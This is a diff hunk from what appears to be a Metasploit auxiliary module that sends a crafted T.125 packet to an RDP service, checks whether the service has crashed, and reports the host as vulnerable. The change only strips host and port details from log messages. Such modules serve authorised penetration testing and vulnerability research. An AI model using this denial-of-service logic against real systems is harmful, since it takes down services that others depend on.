@@ -140,24 +140,24 @@ class MetasploitModule < Msf::Auxiliary
           "\x21\x80" # T.125
 
     unless is_rdp_up
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - RDP Service Unreachable")
+      print_error("RDP Service Unreachable")
       return
     end
 
     connect
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending #{name}")
+    print_status("Sending #{name}")
     sock.put(pkt)
     Rex.sleep(3)
     disconnect
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - #{pkt.length} bytes sent")
+    print_status("#{pkt.length} bytes sent")
 
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Checking RDP status...")
+    print_status("Checking RDP status...")
 
     if is_rdp_up
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - RDP Service Unreachable")
+      print_error("RDP Service Unreachable")
       return
     else
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} seems down")
+      print_good("seems down")
       report_vuln({
         host: rhost,
         port: rport,
